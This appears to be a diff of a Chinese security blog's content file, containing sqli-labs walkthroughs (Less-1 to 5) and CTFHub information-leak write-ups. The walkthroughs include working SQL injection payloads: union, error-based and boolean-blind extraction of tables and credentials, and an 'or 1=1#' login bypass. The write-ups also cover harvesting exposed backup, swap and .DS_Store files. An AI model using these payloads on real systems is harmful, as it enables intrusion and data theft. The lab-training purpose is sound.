 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20extractvalue(1,concat(0x7e,(select%20@@version),0x7e))--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092404.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092404.png" alt="image"></p>
 <h4 id="使用updatexml-函数"><a href="#使用updatexml-函数" class="headerlink" title="使用updatexml()函数"></a>使用updatexml()函数</h4><p>sql语句：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br></pre></td></tr></table></figure>
 <p>请求payload：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092405.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092405.png" alt="image"></p>
 <h3 id="利用数据的重复性报错注入"><a href="#利用数据的重复性报错注入" class="headerlink" title="利用数据的重复性报错注入"></a>利用数据的重复性报错注入</h3><p>sql语句：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x</span><br></pre></td></tr></table></figure>
 <p>请求payload：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27union%20select%201,2,3%20from%20(select%20NAME_CONST(version(),1),%20NAME_CONST(version(),1))x%20--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092406.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092406.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>sqli-labs靶场</category>
@@ -1667,50 +1667,50 @@
 <p>我们从这这一关开始学习盲注。结合 background-2 的信息，将上述能使用的 payload 展示<br>一下使用方法。</p>
 </blockquote>
 <p>这里说一下，有很多的 blog 是翻译或者 copy 的，这关正确的思路是盲注。从源代码中可以<br>看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了，<br>所以我们不能利用上述 less1-4 的方法</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092308.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092308.png" alt="image"></p>
 <h3 id="利用left-函数注入"><a href="#利用left-函数注入" class="headerlink" title="利用left()函数注入"></a>利用left()函数注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(version(),1)&#x3D;5--+</span><br></pre></td></tr></table></figure>
 <p>查看一下 version()，数据库的版本号为 5.6.17，这里的语句的意思是看版本号的第一位是<br>不是 5，明显的返回的结果是正确的。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092309.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092309.png" alt="image"></p>
 <p>当版本号不对的时候，则显示为空</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092310.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092310.png" alt="image"></p>
 <p>猜测数据库长度，已知数据库长度为8</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(length(database()),1)&#x3D;8--+  &#x2F;&#x2F;length(database())得到数据库的长度</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092311.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092311.png" alt="image"></p>
 <p>猜测数据库第一位</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(database(),1)%3E%27a%27--+</span><br></pre></td></tr></table></figure>
 <p>Database()为 security，所以我们看他的第一位是否 &gt; a,很明显的是 s &gt; a,因此返回正确。当我们不知情的情况下，可以用二分法来提高注入的效率。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092312.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092312.png" alt="image"></p>
 <p>猜测数据库第二位，得知第一位是s，我们看前两位是否大于sa</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(database(),2)%3E%27sa%27--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092313.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092313.png" alt="image"></p>
 <p>往下的举一反三。即可得到完整的数据库名</p>
 <h3 id="利用substr-ascii-注入"><a href="#利用substr-ascii-注入" class="headerlink" title="利用substr()ascii()注入"></a>利用substr()ascii()注入</h3><p>根据以上得知数据库名为 security，那我们利用此方式获取 security 数据库下的表。<br>获取 security 数据库的第一个表的第一个字符</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%200,1),1,1))&gt;101--+</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>此处 table_schema 可以写成 =’security’，但是我们这里使用的 database()，是因<br>为此处 database()就是 security。此处同样的使用二分法进行测试，直到测试正确为止，此处应该是 101，因为第一个表示 email。</p>
 </blockquote>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092314.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092314.png" alt="image"></p>
 <p>如何获取第一个表的第二位字符呢？<br>这里我们已经了解了 substr()函数，这里使用 substr(**,2,1)即可</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%200,1),2,1))&gt;101--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092315.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092315.png" alt="image"></p>
 <p>那如何获取第二个表呢？思考一下！<br>这里可以看到我们上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始，获取第一个。那要获取第二个是不是就是 limit 1,1！</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%201,1),1,1))&gt;113--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092316.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092316.png" alt="image"></p>
 <p>以后的过程就是不断的重复上面的，这里就不重复造轮子了。原理已经解释清楚了。<br>当你按照方法运行结束后，就可以获取到所有的表的名字</p>
 <h3 id="利用regexp获取users表中的列"><a href="#利用regexp获取users表中的列" class="headerlink" title="利用regexp获取users表中的列"></a>利用regexp获取users表中的列</h3><p>sql语句</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1)</span><br></pre></td></tr></table></figure>
 <p>payload请求</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%201&#x3D;(select%201%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20and%20table_name%20regexp%20%27^us[a-z]%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092317.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092317.png" alt="image"></p>
 <p>上述语句时选择 users 表中的列名是否有 us**的列</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%201&#x3D;(select%201%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20and%20column_name%20regexp%20%27^username%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092318.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092318.png" alt="image"></p>
 <p>上图中可以看到 username 存在。我们可以将 username 换成 password 等其他的项也是正确的</p>
 <h3 id="利用ord-函数和mid-函数获取users表的内容"><a href="#利用ord-函数和mid-函数获取users表的内容" class="headerlink" title="利用ord()函数和mid()函数获取users表的内容"></a>利用ord()函数和mid()函数获取users表的内容</h3><p>sql语句</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&#x3D; 68</span><br></pre></td></tr></table></figure>
 <p>payload请求</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))&#x3D;%2068--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092319.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092319.png" alt="image"></p>
 <p>获取 users 表中的内容。获取 username 中的第一行的第一个字符的 ascii，与 68 进行比较，即为 D。而我们从表中得知第一行的数据为 Dumb。所以接下来只需要重复造轮子即可</p>
 <hr>
 <p>总结：以上我们通过使用不同的语句，将通过布尔盲注 SQL 的所有<br>的 payload 进行演示了一次。想必通过实例更能够对 sql 布尔盲注语句熟悉和理解了。</p>
@@ -1795,32 +1795,32 @@
     <title>sqli-labs靶场Less-1-4</title>
     <url>/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-1-4/</url>
     <content><![CDATA[<h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><h3 id="验证存在SQL注入"><a href="#验证存在SQL注入" class="headerlink" title="验证存在SQL注入"></a>验证存在SQL注入</h3><p><strong><a href="http://47.101.62.20:11567/Less-1/?id=1">http://47.101.62.20:11567/Less-1/?id=1</a></strong> 后面直接添加一个’，报错</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092304.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092304.png" alt="image"></p>
 <h3 id="使用order-by得到有多少字段数"><a href="#使用order-by得到有多少字段数" class="headerlink" title="使用order by得到有多少字段数"></a>使用order by得到有多少字段数</h3><p>依次请求order by 1,2,3,4直到报错。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;1%27order%20by%204--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092305.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092305.png" alt="image"></p>
 <p>证明有三个字段</p>
 <h3 id="使用union联合注入，得到能回显的字段"><a href="#使用union联合注入，得到能回显的字段" class="headerlink" title="使用union联合注入，得到能回显的字段"></a>使用union联合注入，得到能回显的字段</h3><p>请求 ?id=-1 union select 1,2,3–+</p>
 <p>id=-1为假，所以页面会执行union select 1,2,3。然后返回能回显的字段</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092306.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092306.png" alt="image"></p>
 <p>得到能回显的字段是2和3</p>
 <h3 id="查数据库中的数据"><a href="#查数据库中的数据" class="headerlink" title="查数据库中的数据"></a>查数据库中的数据</h3><h4 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+</span><br></pre></td></tr></table></figure>
 <p>此时的SQL语句为</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(schema_name),3 from information_schema.schemata--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092301.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092301.png" alt="image"></p>
 <h4 id="爆-security-数据库的数据表"><a href="#爆-security-数据库的数据表" class="headerlink" title="爆 security 数据库的数据表"></a>爆 security 数据库的数据表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema&#x3D;%27security%27--+</span><br></pre></td></tr></table></figure>
 <p>此时的SQL语句为</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092302.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092302.png" alt="image"></p>
 <h4 id="爆-users-表的列"><a href="#爆-users-表的列" class="headerlink" title="爆 users 表的列"></a>爆 users 表的列</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27--+</span><br></pre></td></tr></table></figure>
 <p>此时的SQL语句为</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092303.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092303.png" alt="image"></p>
 <h4 id="爆-users表中username和password的值"><a href="#爆-users表中username和password的值" class="headerlink" title="爆 users表中username和password的值"></a>爆 users表中username和password的值</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,username,password%20from%20users%20where%20id&#x3D;2--+</span><br></pre></td></tr></table></figure>
 <p>此时的SQL语句为</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,username,password from users where id&#x3D;2--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092307.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092307.png" alt="image"></p>
 <h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>可以成功注入的有：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1</span><br><span class="line">or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
 <p>其余的ppayload于less1中一致，只需要将less1中的’去掉即可</p>
@@ -1900,7 +1900,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from admin where username&#x3D;’admin’ and password&#x3D;’admin’</span><br></pre></td></tr></table></figure>
 <p>我们可以用’ or 1=1#作为密码输入。原因是为什么？这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的sql语句为：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from admin where username&#x3D;’admin’ and password&#x3D;’’or 1&#x3D;1#’</span><br></pre></td></tr></table></figure>
-<p><strong>Explain</strong>:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。<br>原因是在where子句后，我们可以看到三个条件语句<strong>username=’admin’ and password=’’ or 1=1</strong>。三个条件用and和or进行拼接。在sql中，我们and的运算优先级大于or的运算优先级。 因此可以看到第一个条件（用 a 表示）是真的，第二个条件（用b 表示）是假的，a and b = false,第一个条件和第二个条件执行and后是假，再与第三<br>个条件 or 运算，因为第三个条件1=1是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092201.png" alt="image"></p>
+<p><strong>Explain</strong>:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。<br>原因是在where子句后，我们可以看到三个条件语句<strong>username=’admin’ and password=’’ or 1=1</strong>。三个条件用and和or进行拼接。在sql中，我们and的运算优先级大于or的运算优先级。 因此可以看到第一个条件（用 a 表示）是真的，第二个条件（用b 表示）是假的，a and b = false,第一个条件和第二个条件执行and后是假，再与第三<br>个条件 or 运算，因为第三个条件1=1是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了<br><img src="https://qiniu.hzktester.top/tp2020092201.png" alt="image"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">①Select * from users where id&#x3D;1 and 1&#x3D;1;</span><br><span class="line">②Select * from users where id&#x3D;1 &amp;&amp; 1&#x3D;1;</span><br><span class="line">③Select * from users where id&#x3D;1 &amp; 1&#x3D;1;</span><br></pre></td></tr></table></figure>
 <p>上述三者有什么区别？①和②是一样的，表达的意思是 id=1 条件和 1=1 条件进行与运算</p>
 <p>③的意思是 id=1 条件与 1 进行&amp;位操作，id=1 被当作 true，与 1 进行 &amp; 运算 结果还是 1，再进行=操作，1=1,还是 1（ps：&amp;的优先级大于=）</p>
@@ -1916,55 +1916,55 @@
   <entry>
     <title>Web基础之信息泄露（上）</title>
     <url>/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081801.png" alt="image"></p>
+    <content><![CDATA[<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><img src="https://qiniu.hzktester.top/tp2020081801.png" alt="image"></p>
 <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名。</p>
 <p>路径遍历漏洞隐藏一般在文件读取或者展示图片功能块这样的通过参数提交上来的文件名</p>
-<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081802.png" alt="image"></p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><img src="https://qiniu.hzktester.top/tp2020081802.png" alt="image"></p>
 <p>点击之后会跳转到flag_in_here这个目录，挨个对里面的目录进行寻找拿到flag</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081803.png" alt="image"><br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081804.png" alt="image"></p>
-<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081805.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081803.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020081804.png" alt="image"></p>
+<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p><img src="https://qiniu.hzktester.top/tp2020081805.png" alt="image"></p>
 <h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>PHPinfo：输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息(License)。</p>
 <p>　　phpinfo() 同时是个很有价值的、包含所有 EGPCS(Environment, GET, POST, Cookie, Server) 数据的调试工具。</p>
 <h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>打开是这样的~</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081806.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081806.png" alt="image"></p>
 <p>浏览目录找到flag</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081807.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081807.png" alt="image"></p>
 <h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码泄露"><a href="#网站源码泄露" class="headerlink" title="网站源码泄露"></a>网站源码泄露</h3><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081808.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081808.png" alt="image"></p>
 <h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><p>常见的网站源码的文件名有：’web’, ‘website’, ‘backup’, ‘back’, ‘www’, ‘wwwroot’, ‘temp’等等。</p>
 <p>常见的网站源码备份文件后缀有：’tar’, ‘tar.gz’, ‘zip’, ‘rar’等等。</p>
 <h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h4><p>只需在网站根目录对可能存在的备份文件名进行遍历爆破。就可以下载到网站源码。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081809.png" alt="image"></p>
-<h3 id="bak文件泄露"><a href="#bak文件泄露" class="headerlink" title="bak文件泄露"></a>bak文件泄露</h3><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081810.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081809.png" alt="image"></p>
+<h3 id="bak文件泄露"><a href="#bak文件泄露" class="headerlink" title="bak文件泄露"></a>bak文件泄露</h3><p><img src="https://qiniu.hzktester.top/tp2020081810.png" alt="image"></p>
 <h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码~</p>
 <h4 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h4><p>访问链接，看到这样：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081811.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081811.png" alt="image"></p>
 <p>flag在index.php的源码里，同时我们想到这是bak文件，试试访问</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081812.png" alt="image"><br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081813.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081812.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020081813.png" alt="image"></p>
 <p>用notepad++打开</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081814.png" alt="image"></p>
-<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081815.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081814.png" alt="image"></p>
+<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p><img src="https://qiniu.hzktester.top/tp2020081815.png" alt="image"></p>
 <h4 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h4><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
 <p>以 index.php 为例：第一次产生的交换文件名为 <strong>.index.php.swp</strong></p>
 <p>再次意外退出后，将会产生名为 <strong>.index.php.swo</strong> 的交换文件</p>
 <p>第三次产生的交换文件则为 <strong>.index.php.swn</strong></p>
 <h4 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h4><p>将缓存文件下载下来，使用vim编辑原有文件，例如下载的 <strong>.index.php.swp</strong>，则说明之前编辑的文件名为<strong>index.php</strong></p>
 <p>会提示是否恢复，选择<strong>R</strong>进行恢复即可看到原始内容</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081816.png" alt="image"><br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081817.png" alt="image"><br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081818.png" alt="image"></p>
-<h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081819.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081816.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020081817.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020081818.png" alt="image"></p>
+<h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><p><img src="https://qiniu.hzktester.top/tp2020081819.png" alt="image"></p>
 <h4 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h4><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。</p>
 <p>如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p>
 <p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
 <p>这里需要一个py脚本：<strong>Python-dsstore-master</strong></p>
-<h4 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081820.png" alt="image"></p>
+<h4 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h4><p><img src="https://qiniu.hzktester.top/tp2020081820.png" alt="image"></p>
 <p>进入Python-dsstore-master目录</p>
 <p>依次输入下图的命令：</p>
 <p>生成.DS_Store.ctfhub（名字可以自定义）</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081821.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081821.png" alt="image"></p>
 <p>用Python-dsstore-master目录中的main.py对刚刚生成的文件.DS_Store.ctfhub进行解析。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081822.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081822.png" alt="image"></p>
 <p>访问我们看到的.txt文件得到flag</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020081823.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020081823.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>Web基础</category>
@@ -1977,7 +1977,7 @@
     <title>Web基础之信息泄露（下）</title>
     <url>/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
     <content><![CDATA[<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>以下需要用到python脚本：Githack<br><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p>
